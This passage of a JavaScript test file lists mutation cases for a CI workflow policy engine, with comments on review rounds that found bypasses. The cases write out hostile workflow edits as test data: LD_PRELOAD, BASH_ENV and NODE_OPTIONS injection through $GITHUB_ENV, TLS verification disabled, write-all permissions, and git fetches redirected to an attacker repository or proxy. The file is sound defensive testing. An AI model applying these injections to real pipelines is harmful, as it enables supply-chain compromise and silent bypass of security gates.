        '      BASH_ENV: /tmp/nobble.sh\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message: /`env:` at .* sets `BASH_ENV`/,
  },
  {
    name: 'LD_PRELOAD, the same injection one level below the interpreter',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      LD_PRELOAD: /tmp/nobble.so\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message: /`env:` at .* sets `LD_PRELOAD`/,
  },
  {
    name: 'PATH redefined in a step `env:` rather than in a script',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Lint\n        run: pnpm lint\n',
        '      - name: Lint\n        env:\n          PATH: /tmp/fake-bin:/usr/bin\n        run: pnpm lint\n',
      ),
    message: /`env:` at .* sets `PATH`/,
  },
  {
    name: 'the vitest report delete dropped, so a restored report keeps its fresh mtime',
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Delete the test reports'),
    pair: PAIRS.suiteNeedsDelete,
  },
  {
    name: 'the e2e report delete dropped for the same reason',
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Delete the e2e report'),
    pair: PAIRS.e2eSuiteNeedsDelete,
  },

  // ---- one compose file list, not two -------------------------------------
  // And the list itself, not merely the fact that there is one (#40 round 7).
  // The rule asked whether `ATRIUM_COMPOSE_FILES` was a non-empty string and
  // never read it, so a blind critic dropped the mail overlay and got a clean
  // policy — and a clean `gate-selftest.mjs`, whose `composeEnv()` was a
  // hard-coded copy of the value rather than a readback of this file. Both ends
  // agreeing about a third thing neither was reading.
  {
    name: 'the mail catcher dropped from the deploy job’s compose file list',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        'ATRIUM_COMPOSE_FILES: docker-compose.yml:docker-compose.mailpit.yml',
        'ATRIUM_COMPOSE_FILES: docker-compose.yml',
      ),
    message: /declares `ATRIUM_COMPOSE_FILES: docker-compose\.yml`, and this deployment is exactly/,
  },
  {
    name: 'a fourth compose file added to the list the preflight approved',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        'ATRIUM_COMPOSE_FILES: docker-compose.yml:docker-compose.mailpit.yml',
        'ATRIUM_COMPOSE_FILES: docker-compose.yml:docker-compose.mailpit.yml:docker-compose.dev.yml',
      ),
    message: /and this deployment is exactly/,
  },
  {
    name: 'the compose file list re-pointed for one command by a one-shot assignment',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/compose-stack.mjs up',
        'run: ATRIUM_COMPOSE_FILES=docker-compose.yml node scripts/ci/compose-stack.mjs up',
      ),
    message: /sets `ATRIUM_COMPOSE_FILES` for one command/,
  },
  {
    name: 'the same divergence spelled as a step `env:`',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Bring the stack up\n',
        '      - name: Bring the stack up\n        env:\n          ATRIUM_COMPOSE_FILES: docker-compose.yml\n',
      ),
    message: /re-declares `ATRIUM_COMPOSE_FILES`/,
  },
  {
    name: 'a second stack brought up with the v1 `docker-compose` binary',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: A second stack',
        '        run: docker-compose -f other.yml -p atrium-ci up -d',
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  {
    name: 'a compose invocation hidden inside `sh -c`, where this engine cannot read it',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: A second stack',
        '        run: sh -c "docker compose -f other.yml -p atrium-ci up -d"',
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  {
    name: 'a bare `docker compose` in the deploy job, carrying its own file list',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: Show what came up',
        '        run: docker compose -p "$ATRIUM_COMPOSE_PROJECT" -f docker-compose.yml ps',
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  // ---- the three the round-3 review walked past the closed list with --------
  // Each reproduced against the round-3 engine, which printed the mutated
  // workflow clean: the rule knew `docker`, `docker-compose` and `sh -c` by
  // name, and none of these is any of those. They are one clause now.
  {
    name: 'the standalone `compose` binary, which is not spelled `docker`',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: A second stack',
        '        run: compose -f other.yml -p atrium-ci up -d',
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  {
    name: 'a second runtime entirely: `podman compose`',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: A second stack',
        '        run: podman compose -f other.yml -p atrium-ci up -d',
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  {
    name: 'compose reached from inside `node -e`, where no rule about binaries can see it',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      insertAfter(s, '        run: node scripts/ci/compose-stack.mjs up', [
        '',
        '      - name: A second stack',
        `        run: node -e "require('node:child_process').execFileSync('docker', ['compose', '-f', 'other.yml', 'up', '-d'])"`,
      ]),
    message: /is not one of the entrypoints this job may use/,
  },
  {
    name: 'a deploy assertion reached through pnpm, in the job whose comment says there is none',
    rule: 'compose-through-one-entrypoint',
    // Found by probing this round's own manager fix rather than by a reviewer:
    // `deployEntrypoint` tested `argv[0]` after `unwrap()` had already stripped
    // the manager, so a `pnpm … exec node scripts/ci/x.mjs` in this job matched
    // the entrypoint. The job's comment has said "No pnpm here" since round 1,
    // and a comment is not a control.
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: pnpm --fail-if-no-match --filter @atrium/web exec node scripts/ci/assert-page-serves.mjs',
      ),
    message: /is not one of the entrypoints this job may use/,
    // The step stops being a recognised invocation of the page assertion for
    // the same reason, so the presence rule is right to say it is missing.
    also: ['required-job-steps', 'required-step-prerequisites'],
  },
  {
    name: 'a third action in the deploy job, which could export NODE_OPTIONS for every step after it',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Write the deployment environment\n',
        '      - name: Cache something\n        uses: actions/cache@0c907a75c2c80ebcb7f088228285e798b750cf8f # v4.2.1\n\n      - name: Write the deployment environment\n',
      ),
    message: /uses `actions\/cache`, which is not one of the actions this job may run/,
  },
  {
    name: 'the deploy job losing the one variable every compose invocation resolves from',
    rule: 'compose-through-one-entrypoint',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_COMPOSE_FILES: docker-compose.yml:docker-compose.mailpit.yml\n',
        '',
      ),
    message: /does not declare `ATRIUM_COMPOSE_FILES`/,
  },

  // ---- the manager table, which round 4 never gave the criteria to ---------
  // Round 4 wrote the admission criteria for `PROTECTED_STEP_LAUNCHERS` and
  // left `PROTECTED_STEP_MANAGERS` exactly as it was: twelve pnpm options, no
  // measurement, no fixture, no argument. Half this repo's gates go through it.
  // Measured under `bash -e <file>` at the repository root, pnpm 10.13.1:
  // `pnpm --filter @atrium/does-not-exist exec node fail7.mjs` prints "No
  // projects matched the filters" and exits **0 in 194ms** with the command
  // never started. Nine steps of the real ci.yml rewritten that way came back
  // clean from the round-4 engine, deploy job included.
  {
    name: 'a filter naming a workspace that does not exist, which pnpm reports as success',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs',
        'run: pnpm --filter @atrium/nope exec node ../../scripts/ci/assert-tables.mjs',
      ),
    message: /passes `--filter` to `pnpm` without `--fail-if-no-match`/,
  },
  {
    name: 'the same with the short spelling, `-F`',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec drizzle-kit migrate',
        'run: pnpm -F @atrium/nope exec drizzle-kit migrate',
      ),
    message: /passes `-F` to `pnpm` without `--fail-if-no-match`/,
  },
  {
    name: 'the same with the value attached, which `optionName()` has to normalise',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/wait-for-postgres.mjs',
        'run: pnpm --filter=@atrium/nope exec node ../../scripts/ci/wait-for-postgres.mjs',
      ),
    message: /passes `--filter` to `pnpm` without `--fail-if-no-match`/,
  },
  {
    name: '`--if-present`, which exits 0 when the script is missing and no filter flag fixes',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter "./packages/*" build',
        'run: pnpm --if-present --fail-if-no-match --filter "./packages/*" build',
      ),
    message: /passes `--if-present` to `pnpm`, which is not one of the options/,
  },
  {
    name: '`--recursive`, which runs the command once per matched project and may match none',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs',
        'run: pnpm -r --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs',
      ),
    message: /passes `-r` to `pnpm`, which is not one of the options/,
  },
  {
    name: 'a package manager nobody justified: `npx`, which came off the table with npm, yarn and bun',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: npx --yes node scripts/ci/assert-page-serves.mjs',
      ),
    message: /reaches the command through `npx`, which is not on the allowlist/,
  },

  {
    name: 'a filtered install on a step no presence rule protects, which installs nothing and exits 0',
    rule: 'package-managers-select-something',
    // Both blind reviews of the first version of the manager fix found this:
    // the rule was stated about how the workflow invokes pnpm and enforced only
    // where a presence matcher already fires. `pnpm --filter
    // @atrium/does-not-exist install --frozen-lockfile` exits 0, installs
    // nothing, and was policy-clean.
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: pnpm install --frozen-lockfile\n',
        '        run: pnpm --filter @atrium/does-not-exist install --frozen-lockfile\n',
      ),
    message: /passes `--filter` to `pnpm` without `--fail-if-no-match`/,
  },
  {
    name: 'the pairing satisfied by the value that turns it off: `--fail-if-no-match=false`',
    rule: 'protected-steps-run-one-command',
    // The critical both foreign lineages found, independently, within minutes.
    // `optionName()` strips an attached value so `--user=root` and `--user root`
    // are one option — right for data, catastrophic for a switch. Measured:
    // `pnpm --fail-if-no-match=false --filter @atrium/nope exec node fail7.mjs`
    // exits 0 in 406ms where the bare flag exits 1.
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs',
        'run: pnpm --fail-if-no-match=false --filter @atrium/nope exec node ../../scripts/ci/assert-tables.mjs',
      ),
    message: /is admissible only written bare/,
  },
  {
    name: 'the same as a differently-spelled flag: `--no-fail-if-no-match`',
    rule: 'protected-steps-run-one-command',
    // Measured at exit 0 as well, and it needs no clause of its own: a
    // different word is not on the list.
    mutate: (s) =>
      replaceOnce(
        s,
        'run: pnpm --fail-if-no-match --filter @atrium/db exec drizzle-kit migrate',
        'run: pnpm --no-fail-if-no-match --filter @atrium/nope exec drizzle-kit migrate',
      ),
    message: /passes `--no-fail-if-no-match` to `pnpm`, which is not one of the options/,
  },

  // ---- where and in what a step runs (#40 round 5) -------------------------
  // Round 4 derived "an action is a program too" and guarded `uses:` in one
  // job. A container is a runtime too. Each of these was clean against the
  // round-4 engine, and the first one silently satisfies `pin-actions-to-sha`
  // as well, because that rule only ever reads `uses:` lines.
  {
    name: 'the deploy job moved wholesale into an author-chosen image',
    rule: 'no-runtime-override',
    mutate: (s) =>
      replaceOnce(
        s,
        '    name: the deployment serves (not the product works)\n',
        `    name: the deployment serves (not the product works)\n    container:\n      image: ghcr.io/example/builder@sha256:${'a'.repeat(64)}\n`,
      ),
    message: /`container: .*` at jobs\.deploy\.container/,
  },
  {
    name: 'a step run from a different directory than the one the ledger replays it in',
    rule: 'no-runtime-override',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Lint\n        run: pnpm lint\n',
        '      - name: Lint\n        working-directory: apps/web\n        run: pnpm lint\n',
      ),
    message: /`working-directory: apps\/web`/,
  },
  {
    name: 'a self-hosted runner, i.e. a different bash, a different node and a different PATH',
    rule: 'no-runtime-override',
    mutate: (s) =>
      replaceOnce(
        s,
        '  deploy:\n    name: the deployment serves (not the product works)\n    runs-on: ubuntu-latest',
        '  deploy:\n    name: the deployment serves (not the product works)\n    runs-on: self-hosted',
      ),
    message: /`runs-on: self-hosted`/,
  },
  {
    name: 'a container action, which `pin-actions-to-sha` deliberately skips',
    rule: 'no-runtime-override',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Lint\n        run: pnpm lint\n',
        '      - name: Lint\n        uses: docker://alpine:3.20\n',
      ),
    message: /is a container action/,
    // The step stops being `pnpm lint`, so the presence rule is right to say
    // the linter is gone. Both statements are true and neither is redundant.
    also: ['required-job-steps'],
  },

  // ---- the environment, inverted (#40 round 5) -----------------------------
  // Round 4 said INJECTING_VARIABLES was "the union" of the variables that make
  // a program run code it was not asked to. Three refutations, all measured,
  // all clean against that engine — and the fix is not three more entries, it
  // is DECLARED_VARIABLES, which refuses a name nobody has justified whether or
  // not anybody has heard of what it does.
  {
    name: 'a shell function exported through the environment: BASH_FUNC_node%%',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      BASH_FUNC_node%%: "() { return 0; }"\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    // Measured: `bash -e step.sh` exits 7; `env "BASH_FUNC_node%%=() { return
    // 0; }" bash -e step.sh` exits 0. A function beats the binary in command
    // position, and `no-command-shadowing` banned only the in-script spelling.
    message: /sets `BASH_FUNC_node%%`.*bash imports exported shell functions/s,
  },
  {
    name: 'certificate verification turned off for every gate in the job',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      NODE_TLS_REJECT_UNAUTHORIZED: "0"\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message: /sets `NODE_TLS_REJECT_UNAUTHORIZED`/,
  },
  {
    name: 'an OpenSSL config, which can load a provider .so into the process',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      OPENSSL_CONF: /tmp/nobble.cnf\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message: /sets `OPENSSL_CONF`/,
  },
  {
    name: 'a variable nobody has justified, which is the whole point of the inversion',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      ATRIUM_SOMETHING_NEW: "1"\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message:
      /`ATRIUM_SOMETHING_NEW` is not one of the environment variables this workflow declares/,
  },
  {
    name: 'the same as a one-shot assignment in front of a command',
    rule: 'no-command-shadowing',
    mutate: (s) => rewriteFetch(s, [`ATRIUM_SOMETHING_NEW=1 ${FETCH}`]),
    message: /assigns `ATRIUM_SOMETHING_NEW` for one command/,
  },
  // ---- and the hole the allowlist still had, found by attacking it ---------
  // A here-document body is data to this parser, deliberately, so a `cat` into
  // `$GITHUB_ENV` is a command with no words: the round-5 allowlist read every
  // word of the command and there were none to read. Only *protected* steps are
  // refused an unquoted heredoc, and this needs no unquoted one — a quoted
  // delimiter on any ordinary step of `verify` was clean. The fix is the same
  // polarity as everything else this round: a write to the job environment must
  // name its variable in a word this engine can read.
  // ---- the node-flag lesson, applied to every binary (#40 round 5, third) ---
  // Round 4 inverted the node flag denylist and applied the argument to `node`
  // alone. A blind review found the other five, and all five were clean:
  // `--dry-run` on the fetch is the ticket's founding defect wearing a flag —
  // `origin/main` never materialises, the ratchet takes its no-baseline exit-0
  // path, and a floor lowered in the same pull request sails through.
  {
    name: 'the baseline fetch with `--dry-run`, which keeps every word and updates no ref',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      rewriteFetch(s, [
        `git fetch --dry-run --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main`,
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },
  // ---- and the same lesson applied to the operands (#40 round 6) ------------
  // Round 5 carried `--dry-run` for this step and nothing about what the fetch
  // was pointed *at*: the rule asked for a word containing `refs/heads/main`,
  // which `+refs/heads/main:refs/remotes/origin/mainx` satisfies while producing
  // no `origin/main` for the ratchet to read. A blind review checked whether it
  // reproduces and found it does not — `actions/checkout` adds the remote, so
  // git's own remote-tracking update writes `origin/main` regardless. Held shut
  // by git's behaviour rather than by the rule, which is not a state to leave a
  // rule in.
  {
    name: 'the baseline fetch aimed at a remote-tracking ref nobody reads',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      rewriteFetch(s, [
        'git fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/mainx',
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the baseline fetch of the right branch into no destination at all',
    rule: 'required-step-prerequisites',
    mutate: (s) => rewriteFetch(s, ['git fetch --no-tags --depth=1 origin refs/heads/main']),
    pair: PAIRS.ratchetNeedsFetch,
  },
  // The run-start timestamp as a *value*. `VITEST_RUN_START=0` was policy-clean
  // on r5, and `report-file.mjs` then computes `mtime + 1000 < 0` — false for
  // every file that has ever existed, so every report is fresh and the whole
  // stale-report class is off. Same shape as `--fail-if-no-match=false`: a rule
  // about a name where the meaning is in the value.
  {
    name: 'the run-start timestamp written down as a constant instead of read from the clock',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(s, ENV_LINE, '        run: echo "VITEST_RUN_START=0" >> "$GITHUB_ENV"\n'),
    pair: PAIRS.suiteNeedsReset,
  },
  {
    name: 'the same for the e2e run-start timestamp',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: echo "E2E_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
        '        run: echo "E2E_RUN_START=1" >> "$GITHUB_ENV"\n',
      ),
    pair: PAIRS.e2eSuiteNeedsReset,
  },
  {
    // The policy half accepts this one — `date` is read — and it is here as an
    // ACCEPTED form below rather than a mutation, because what refuses it is
    // `report-file.mjs`. Its neighbour, which the policy *does* refuse:
    name: 'the timestamp taken from a variable rather than from a clock',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        ENV_LINE,
        '        run: echo "VITEST_RUN_START=$RUN_START" >> "$GITHUB_ENV"\n',
      ),
    pair: PAIRS.suiteNeedsReset,
    also: ['environment-is-declared'],
  },
  {
    name: 'the timestamp computed by something that is not a clock',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(s, ENV_LINE, '        run: echo "VITEST_RUN_START=$(echo 0)" >> "$GITHUB_ENV"\n'),
    pair: PAIRS.suiteNeedsReset,
  },
  // The policy engine's own argument, which no rule had ever looked at.
  {
    name: 'the policy engine pointed at a file that is not a workflow',
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: node scripts/ci/workflow-policy.mjs .github/workflows\n',
        '        run: node scripts/ci/workflow-policy.mjs /dev/null\n',
      ),
    message: /never runs the workflow policy engine, over the whole workflow directory/,
  },
  {
    name: 'the policy engine given the round-5 glob, which misses every `.yaml`',
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: node scripts/ci/workflow-policy.mjs .github/workflows\n',
        '        run: node scripts/ci/workflow-policy.mjs .github/workflows/*.yml\n',
      ),
    message: /never runs the workflow policy engine, over the whole workflow directory/,
  },
  {
    name: 'the Playwright suite with `--list`, which prints the tests and runs none',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'playwright test --reporter=list,json',
        'playwright test --list --reporter=list,json',
      ),
    message: /never runs the Playwright suite/,
    also: ['required-step-prerequisites'],
  },
  {
    name: 'the unit suite narrowed to a pattern nothing matches',
    rule: 'required-job-steps',
    mutate: (s) => replaceOnce(s, 'pnpm vitest run', 'pnpm vitest run -t nomatch_xyz'),
    message: /never runs the unit\/integration suite/,
    also: ['required-step-prerequisites'],
  },
  {
    name: 'actionlint printing its version instead of linting',
    rule: 'policy-steps-present',
    mutate: (s) => replaceOnce(s, 'actionlint" -color', 'actionlint" -color -version'),
    message: /never runs actionlint/,
  },
  {
    name: 'the Chromium install with `--dry-run`, so the browser check has nothing to find',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        'playwright install --with-deps chromium',
        'playwright install --dry-run --with-deps chromium',
      ),
    pair: PAIRS.chromiumNeedsInstall,
  },
  {
    name: 'a `uses:` in a YAML flow mapping, where the line scan could not see the mutable tag',
    rule: 'pin-actions-to-sha',
    // Found by a blind review of this round's fix, and it had been open since
    // round 1: `USES_LINE` is a scan of raw lines, so `- { name: Checkout,
    // uses: actions/checkout@v4 }` — legal YAML that GitHub runs — was clean,
    // with a mutable tag, on the action that checks out the code.
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Checkout\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
        '      - { name: Checkout, uses: actions/checkout@v4 }\n',
      ),
    message: /`uses: actions\/checkout@v4` is not pinned to a 40-character commit SHA/,
  },
  {
    name: 'a second occurrence borrowing the first one’s version comment',
    rule: 'pin-actions-to-sha',
    // Indexing comments by ref let an uncommented flow-mapping `uses:` of an
    // already-commented action pass. One comment per occurrence, consumed.
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Checkout\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
        '      - { name: Checkout, uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 }\n',
      ),
    message: /Every occurrence needs its own/,
  },
  {
    name: 'the same pinned to a SHA, where the version comment now has nowhere to live',
    rule: 'pin-actions-to-sha',
    mutate: (s) =>
      replaceOnce(
        s,
        '      - name: Checkout\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
        '      - { name: Checkout, uses: actions/checkout@1111111111111111111111111111111111111111 }\n',
      ),
    message: /is not written as a `uses:` line of its own/,
  },
  {
    name: 'the job environment written through an expansion the target test did not know',
    rule: 'no-command-shadowing',
    // `${GITHUB_ENV:?}` expands to the same path and matched nothing, so the
    // payload was never inspected. Found by a blind review of this round's fix.
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
        '        run: echo "NODE_OPTIONS=--require /tmp/nobble.cjs" >> "${GITHUB_ENV:?}"\n',
      ),
    message: /writes `NODE_OPTIONS=…` to `\$GITHUB_ENV`/,
    also: ['required-step-prerequisites'],
  },
  {
    name: 'the job environment written by an argument rather than a redirection: `tee -a`',
    rule: 'no-command-shadowing',
    // The other half of the same miss: the check only ever looked at
    // redirections, and `tee`, `dd of=` and `sponge` name the file as an
    // argument. One clause if the question is "does any word name that file".
    mutate: (s) =>
      insertAfter(s, '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"', [
        '',
        '      - name: Note the toolchain',
        '        run: |',
        `          printf '%s\\n' 'NODE_OPTIONS=--require /tmp/nobble.cjs' | tee -a "$GITHUB_ENV"`,
        '          true',
      ]),
    message: /writes to `\$GITHUB_ENV`.*without a literal `NAME=`/s,
  },
  {
    name: 'the same with the file named inside a longer word: `dd of="$GITHUB_ENV"`',
    rule: 'no-command-shadowing',
    // The `tee` fix compared the whole word, so a writer that takes its target
    // as `of=<path>` named the file and matched nothing. The test is a
    // substring now, which over-approximates in the safe direction.
    mutate: (s) =>
      insertAfter(s, '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"', [
        '',
        '      - name: Note the toolchain',
        '        run: |',
        `          printf '%s\\n' 'NODE_OPTIONS=--require /tmp/nobble.cjs' | dd of="$GITHUB_ENV" oflag=append conv=notrunc`,
        '          true',
      ]),
    message: /writes to `\$GITHUB_ENV`.*without a literal `NAME=`/s,
  },
  {
    name: 'NODE_OPTIONS smuggled into $GITHUB_ENV through a here-document body',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      insertAfter(s, '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"', [
        '',
        '      - name: Note the toolchain',
        '        run: |',
        `          cat >> "$GITHUB_ENV" <<'EOF'`,
        '          NODE_OPTIONS=--require ./nobble.cjs',
        '          EOF',
      ]),
    message: /writes to `\$GITHUB_ENV`.*without a literal `NAME=`/s,
  },
  {
    name: 'the same through a command substitution, which is opaque to this parser',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
        `        run: echo "$(printf 'NODE_OPTIONS=--require ./nobble.cjs')" >> "$GITHUB_ENV"\n`,
      ),
    message: /writes to `\$GITHUB_ENV`.*without a literal `NAME=`/s,
    // It replaces the run-start timestamp, so the vitest freshness gate loses
    // the prerequisite it reads. Both are true: the timestamp is gone and the
    // environment is being written by something nothing here can read.
    also: ['required-step-prerequisites'],
  },

  // ---- least privilege, at the level where the asking happens (#40 round 7) --
  // `least-privilege` read `workflow.permissions.contents === 'read'` and
  // stopped. A job-level `permissions:` block *replaces* the workflow default
  // rather than narrowing it, so all three of these were clean against the
  // engine as committed: `node scripts/ci/workflow-policy.mjs .github/workflows`
  // exited 0 and all 182 mutations of the day still passed. The rule's own
  // sentence — "so a job inherits nothing it did not ask for" — was unenforced
  // at exactly the level where a job asks.
  {
    name: 'the deploy job voting itself write access to the repository and its registry',
    rule: 'least-privilege',
    mutate: (s) =>
      replaceOnce(
        s,
        '  deploy:\n    name: the deployment serves (not the product works)\n',
        '  deploy:\n    name: the deployment serves (not the product works)\n    permissions:\n      contents: write\n      packages: write\n',
      ),
    message: /job `deploy` declares `permissions:` that grants `contents: write`/,
  },
  {
    name: 'the same in the string form, which cannot be narrowed at all',
    rule: 'least-privilege',
    mutate: (s) =>
      replaceOnce(
        s,
        '  deploy:\n    name: the deployment serves (not the product works)\n',
        '  deploy:\n    name: the deployment serves (not the product works)\n    permissions: write-all\n',
      ),
    message:
      /job `deploy` declares `permissions:` that is the string form `permissions: write-all`/,
  },
  {
    name: 'a read scope nobody reads, added beside the workflow default',
    rule: 'least-privilege',
    // The allowlist from the other direction: `packages: read` is not a write
    // and is still refused, because `contents` is the only scope this workflow
    // reads and a list of scopes somebody judged dangerous is complete until the
    // next release note.
    mutate: (s) =>
      replaceOnce(
        s,
        'permissions:\n  contents: read',
        'permissions:\n  contents: read\n  packages: write',
      ),
    message: /workflow-level `permissions:` grants `packages: write`/,
  },

  // ---- the fetch's source, not only its destination (#40 round 7) -----------
  // Round 6 pinned the refspec and never looked at the remote. `git fetch`'s
  // operands are `<remote> <refspec>…`, and all four of these were clean against
  // the engine as committed — the first two measured directly, the policy
  // reporting `.github/workflows/ci.yml clean.` and exiting 0.
  {
    name: 'the baseline fetched from somebody else’s repository into the ref the ratchet reads',
    rule: 'required-step-prerequisites',
    // `origin/main` resolves afterwards, so `assert-floor-ratchet.mjs`'s "fatal
    // on an unresolvable ref" check is satisfied — by a tree of the author's
    // choosing, which every floor in the pull request is then compared against.
    mutate: (s) =>
      rewriteFetch(s, [
        'git fetch --no-tags --depth=1 https://github.com/attacker/atrium +refs/heads/main:refs/remotes/origin/main',
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the same remote reached over ssh, where the URL does not look like one',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      rewriteFetch(s, [
        'git fetch --no-tags --depth=1 git@github.com:attacker/atrium +refs/heads/main:refs/remotes/origin/main',
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the remote left alone and rewritten underneath: `git -c url.<attacker>.insteadOf=…`',
    rule: 'required-step-prerequisites',
    // The blocking finding of this round, and the reviewer's sentence for it:
    // "that is the value-vs-presence defect reproduced inside your fix for the
    // value-vs-presence defect". `-c` was on the flag list by name, with the
    // file's own comment saying its value "is a bare word and is not checked,
    // because it is data" — so `origin` is named, the refspec is exact, every
    // flag is allowed, and git rewrites the URL before it connects.
    mutate: (s) =>
      rewriteFetch(s, [
        'git -c url.https://github.com/attacker/.insteadOf=https://github.com/lmvdz/ fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main',
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'a different transport knob through the same flag: `-c http.proxy=…`',
    rule: 'required-step-prerequisites',
    // Here so the entry is an allowlist of *values* rather than a refusal of the
    // one spelling above. `protocol.version=<n>` is the only assignment argued
    // for; `http.proxy`, `core.gitProxy`, `remote.origin.url` and the next one
    // are refused without this file having heard of them.
    mutate: (s) =>
      rewriteFetch(s, [
        'git -c http.proxy=http://attacker.invalid:8080 fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main',
      ]),
    pair: PAIRS.ratchetNeedsFetch,
  },

